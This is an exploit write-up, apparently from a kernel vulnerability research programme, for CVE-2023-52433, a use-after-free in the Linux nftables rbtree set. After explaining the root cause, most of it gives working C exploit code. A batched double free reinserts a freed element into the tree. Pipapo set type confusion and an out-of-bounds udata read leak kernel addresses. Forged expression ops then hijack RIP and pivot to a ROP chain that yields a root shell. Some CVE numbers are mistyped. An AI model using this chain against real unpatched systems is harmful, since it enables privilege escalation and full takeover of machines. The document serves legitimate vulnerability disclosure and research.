# Exploit detail about CVE-2023-52433
If you want to get some base information about CVE-2023-52433, please read [vulnerability.md](./vulnerability.md) first.

The cause and exploitation of CVE-2023-52433 are essentially the same as those of CVE-2024-26581. You can also understand CVE-2023-52433 by reading the [documentation](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2024-26581_lts_cos_mitigation/docs/vulnerability.md) for CVE-2024-26581.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Cause anaylysis
In function `__nft_rbtree_insert`, when it calls `nft_rbtree_gc_elem`, it checks whether an element has timed out and should call gc through the following code:
```c 
    /* perform garbage collection to avoid bogus overlap reports. */
    if (nft_set_elem_expired(&rbe->ext)) {
        err = nft_rbtree_gc_elem(set, priv, rbe, genmask);
        if (err < 0)
 				return err;
```
However, the check here does not consider whether the corresponding element is newly added in the current batch instruction. This means that if another instruction fails and a rollback occurs, the added element to be rolled back may have been released by the GC, resulting in a use-after-free issue.

The lack of this check may result in use-after-free of the set element pointed to by prev. The check added by [patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit?id=2ee52ae94baabf7ee09cf2a8d854b990dac5d0e4) (`nft_set_elem_active(&rbe_prev->ext, cur_genmask)`) means checking whether prev setelem is added by the current batch command. Without this check, when prev setelem is added by the current batch command and other commands have errors, triggering the command rollback mechanism of nftables, `nf_tables_abort` will eventually be called to roll back the executed command. At this time, two deletion operations will be generated for prev setelem, and the paths are:
1. `nft_rbtree_gc_elem` -> `nft_trans_gc_queue_sync_done` -> `nft_trans_gc_trans_free` -> `nf_tables_set_elem_destroy`
2. `nf_tables_abort` -> `nf_tables_abort_release` -> `nft_set_elem_destroy` 


## Triggering the vulnerability (condensed)

- Create an rbtree set **A** with `NFT_SET_TIMEOUT` and `NFT_SET_INTERVAL`.
- **In a single batch**, send steps 2–5 together:
  - Add element **D** to **A** with `NFTA_SET_ELEM_EXPIRATION` and `NFTA_SET_ELEM_TIMEOUT` (short timeout).
  - Add padding/delay operations so **D** expires.
  - Add another element **E** with `NFT_SET_ELEM_INTERVAL_END` (this path reaches `nft_rbtree_gc_elem`).
  - Send an invalid command to trigger `__nf_tables_abort` (batch rollback).

In this write-up, the target object size is constrained so allocations land in **`kmalloc-256`**.

### Clear workflow (credit: @artmetla)
```c
Batch Begin
    ↓
[1] Add element D (timeout=SHORT)
    ↓
[2] Add padding operations (delay)
    ↓
    ... time passes, D expires ...
    ↓
[3] Add element E
    ├→ __nft_rbtree_insert(E)
    │   └→ overlap detection walk
    │       └→ finds D expired
    │           └→ nft_rbtree_gc_elem(D) ← FREE #1
    ↓
[4] Invalid operation
    └→ __nf_tables_abort()
        └→ rollback all batch ops
            └→ nft_set_elem_destroy(D) ← FREE #2 (UAF!)
```

## Exploit it in mitigation slot


Exploiting CVE-2024-52433 is similar to exploiting CVE-2024-26581. Due to this [patch](https://github.com/thejh/linux/commit/5437982404c326744b3921de112ec1654fc6d20b), we cannot simply exploit the heap vulnerability. Instead, we need to use the `rbtree_remove` function of rbtree to insert the released element into the node of rebtree, just like CVE-2024-28581.

In this article, we will only focus on the different parts of the two exploits, namely how to construct an rbtree and finally place a freed element in the rbtree.


In the process of removing a node from an rbtree, there are the following scenarios: if the node is the left child of its parent and has a non-empty left child node while its right child node is empty, the parent's left child node is replaced with its own left child node. If the node is the right child of its parent and has a non-empty right child node while its left child node is empty, the parent's right child node is replaced with its own right child node.

Based on the above characteristics, I exploit CVE-2023-52433 by following these two key steps:
```c
    //step1: prepare env
    uint64_t timeout_long = 0xffff000000000000; //Long timeout value, avoid get timeout when we exploit
    uint64_t timeout_short = 0x0100000000000000; //Short timeout value, easily get timeout
    //init rbtree first
    new_set_rbtree_for_timeout(socket,table, rbtree_set, NFT_OBJECT_CT_EXPECT,0x40);
    *key1 = 0x90;
    msg_list[0] = new_setelem_with_expiration_msg(table, rbtree_set, NULL, 0, obj_for_exp, key1, 0x40, NULL, 0, 0, timeout_long);
    *key1 = 0x80;
    msg_list[1] = new_setelem_with_expiration_msg(table, rbtree_set, NULL, 0, obj_for_exp, key1, 0x40, NULL, 0, 0, timeout_long);
    *key1 = 0x88;
    msg_list[2] = new_setelem_with_INTERVAL_END_msg(table, rbtree_set, key1, 0x40);
    //step2: trigger the vul
    //Now trigger the vul. We will insert the 0x60 set element in rbtree set after it was freed
    *key1 = 0x70;
    msg_list[0] = new_setelem_with_expiration_msg(table, rbtree_set, NULL, 0, obj_for_exp, key1, 0x40, NULL, 0, 0, timeout_short);
    *key1 = 0x60;
    msg_list[1] = new_setelem_with_expiration_msg(table, rbtree_set, pad, 0x60, obj_for_exp, key1, 0x40, NULL, 0, 0, timeout_long);
    
    char *tmp = malloc(0x20);
    //These messages used to fill in the command to ensure that element has timed out when executing msg[0x3c2]
    for(i=0;i<0x3c0;i++){
    	snprintf(tmp, 0x20, "chain for pad %d", i);
	msg_list[i+2] = new_chain_msg(table, tmp, 0);
    }
    *key1 = 0x78;
    msg_list[0x3c2] = new_setelem_with_INTERVAL_END_msg(table, rbtree_set, key1, 0x40); //gc here
    msg_list[0x3c3] = new_chain_msg("test","test",0);
    send_msg_list(socket, msg_list, 0x3c4);

```
After step 1, we created 3 set elements(I mark these elements by the value in key. Here we assume they are `element A` (element marked by `*key1 = 0x90`), `element B` (element marked by `*key1 = 0x80`), `element C` (element marked by `*key1 = 0x88`)). Below are the positions of these three elements in rbtree:
```
            C(key=0x88)
           /          \       
          /            \ 
         A(key=0x90)    B(key=0x80)
```
That is, `element C` will be the root node, `element A` will be the left child of `element C`, and `element B` will be the right child of `element C`.

And that's what will happen after we send the message list in step2:
- msg[0]: Insert an `element D` (marked by `*key1 = 0x70`). Note that the timeout of `element D` is short to ensure that `element D` has timed out when `msg[0x3c2]` is executed. After inserting element D, the rbtree will look like this:

```
            C(key=0x88)
           /          \       
          /            \ 
         A(key=0x90)    B(key=0x80)
                         \
                          \
                           D(key=0x70)
```
- msg[1]: Insert an `element E` (marked by `*key1 = 0x60`).  After inserting element D, the rbtree will look like this: 

```
            C(key=0x88)
           /          \       
          /            \ 
         A(key=0x90)    D(key=0x70)
                       /          \
                      /            \
                     B(key=0x80)    E(key=0x60)
```
- msg[2-0x3c1]: These messages used to fill in the command to ensure that `element D` has timed out when executing `msg[0x3c2]`
- msg[0x3c2]: Insert an `element F`(marked by `*key1 = 0x78`) into `rbtree_set` with triggering `nft_rbtree_gc_elem`. Finally the `element C` we created in step1 and the `element D` (because of time out) we create in `step2 msg[0]` will be removed by `rb_erase` and destroy by `nft_set_gc_batch_complete`. After that, the rbtree will look like this:
```
            B(key=0x80)
           /          \       
          /            \ 
         A(key=0x90)    E(key=0x60)
                       /          
                      /            
                     F(key=0x78)    
```  
- msg[0x3c3]: Error message and finally trigger `__nf_tables_abort`. All previous messages will be rolled back:
  - The `element F` created in msg[0x3c2] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy`. After that, the rbtree will look like this:
```
            B(key=0x80)
           /          \       
          /            \ 
         A(key=0x90)    E(key=0x60)    
```  


-  - The `element E` created in msg[1] will be removed and freed. After that, the rbtree will look like this:
```
            B(key=0x80)
           /             
          /          
         A(key=0x90)    
``` 
-  - The `element D` created in msg[0] will be removed by function `nft_rbtree_remove` and will be freed by function `nft_set_elem_destroy` again! After we call `rb_erase` for `element D` when handling msg[0x3c2], the node struct of `element D` still looks like:
```
            B(key=0x80)
                      \       
                       \ 
                       D(key=0x70)
                                 \
                                  \
                               E(key=0x60)
```  
- - So the second time `rb_erase` is called on `element D`, it will replace `element E` to the right child node of `element D`'s parent node again! This means that we reinserted the `element E` that was about to be freed into the rbtree! After this, we get a UAF on `element E`! After that, the rbtree will look like this:
```
            B(key=0x80)
           /          \       
          /            \ 
         A(key=0x90)    E(key=0x60)      
```
  

After that, we can complete the exploit through the different sizes of the setelement of different sets. Here are the complete steps:

- 1. Construct an rbtree that meets the requirements
- 2. The vulnerability is triggered by the method mentioned above, and finally a released `element E` will be inserted into rbtree.
- 3. Create an `element F` of a pipapo set to get the heap of the `element E` back. Because the `nft_set_ext` offset in `nft_rbtree_elem` and `nft_pipapo_elem` is different, we can fake the `ext` in `nft_rbtree_elem` by filling some fields of `ext` in `nft_pipapo_elem` (just like some type confusion exploits).
  ```c
  struct nft_pipapo_elem {
	struct nft_set_ext ext;
  };

  struct nft_rbtree_elem {
	struct rb_node		node;
	struct nft_set_ext	ext;
  };

  ```
  The key point is to forge NFT_SET_EXT_USERDATA and udata_size, which represents the length of udata, because we need to leak information through out-of-bounds reading of udata.
  ```c
    //step 3
    //Now we have a free setelem in rbtree_set
    //We pad some parts of the set element, which is some fake part of set element of rbtree_set
    *(uint64_t *)&key[12] = 0x3000000000006000;//NFT_SET_EXT_KEY=0x60, NFT_SET_EXT_USERDATA=0x30
    *(uint64_t *)&key[20] = 0;
    *&key[60] = 0xff;//fake udata_size
    *(uint64_t *)&pad[7] = 0x70; //fake key
    new_setelem_with_expr(socket, table, pipapo_set, pad, 0x70, obj_for_exp, key, 0x40, NULL, 0);
  ```
- 4. Create some bitmap elements to ensure that when reading udata out of bounds, you can read an element pointer(because the head of `nft_bitmap_elem` will save a doubly linked list):
  ```c
  struct nft_bitmap_elem {
	struct list_head	head;
	struct nft_set_ext	ext;
  };
  ```
- 5. Get `element E`. We will get the address of `nft_last_ops` and the address and the key of an `element G` of bitmap set.
- 6. Delete the `element G` we get in step 5.
- 7. Create some bitmap elements with our ROP gadget to get the heap of the `element G` back.
- 8. Delete the `element F`
- 9. Create an `element H` of a pipapo set to get the heap of the `element E` back(just like step 3). This time we hijack RIP by forging NFT_SET_EXT_EXPRESSIONS and nft_expr:
  ```c
    *(uint64_t *)&key[12] = 0x3000000000007800;//NFT_SET_EXT_KEY=0x78, NFT_SET_EXT_USERDATA=0x30
    *(uint64_t *)&key[20] = 0x5058;//NFT_SET_EXT_EXPRESSIONS=0x58, NFT_SET_EXT_OBJREF=0x50

    *(uint64_t *)&pad[0x17] = 0x10;//setelem->expr's size
    *(uint64_t *)&pad[0x1f] = ops_addr+0x20;//setelem->expr[0]->ops
    *(uint64_t *)&pad[0x27] = kernel_off + 0xffffffff8195e9f0;//pop rsp; ret  stack migration second
    *(uint64_t *)&pad[0x2f] = ops_addr+0x20;
    *(uint64_t *)&pad[0x37] = 0x70; //fake key
  ```
- 10. Get `element E`. We will hijack RIP, perform stack migration, and finally jump to the ROP gadget to get the root shell:
  ```c
  	static int nf_tables_fill_expr_info(struct sk_buff *skb,
						const struct nft_expr *expr)
	{
		if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
			goto nla_put_failure;

		if (expr->ops->dump) {
			struct nlattr *data = nla_nest_start_noflag(skb,
									NFTA_EXPR_DATA);
			if (data == NULL)
				goto nla_put_failure;
			if (expr->ops->dump(skb, expr) < 0) //we hijack RIP here
				goto nla_put_failure;
			nla_nest_end(skb, data);
		}
  ```

#### ROP detail

The assembly code when calling `expr->ops->dump` is as follows:

```
	mov     rax, [rbp+0]
	mov     rsi, rbp
	mov     rdi, rbx
	mov     rax, [rax+40h]
	call    __x86_indirect_thunk_rax
```
So the `rbp` is the pointer of the current `nft_expr`. We fill it by following:
```c
	...
	*(uint64_t *)&pad[0x1f] = ops_addr+0x20;//setelem->expr[0]->ops
    *(uint64_t *)&pad[0x27] = kernel_off + POP_RSP_RET;//stack migration second
    *(uint64_t *)&pad[0x2f] = ops_addr+0x20;
    ...
```

The first step of ROP start looks like this(We fill the ops pointer in step 8):
```
expr->ops->dump(skb, expr)  --> leave ; ret 
```
This will finally makes this happen:

```
rsp = element + 0x28 // mov rsp, rbp  
rbp = *(element + 0x28) //pop rbp  rbp=*(&setelem_data[0x28])
rsp = element + 0x30 
rip = *(element + 0x30) //ret   rip=*(&setelem_data[0x30])
rsp = element + 0x38 
```
After completing the stack migration, we can run ROPgadget and finally get the root shell.
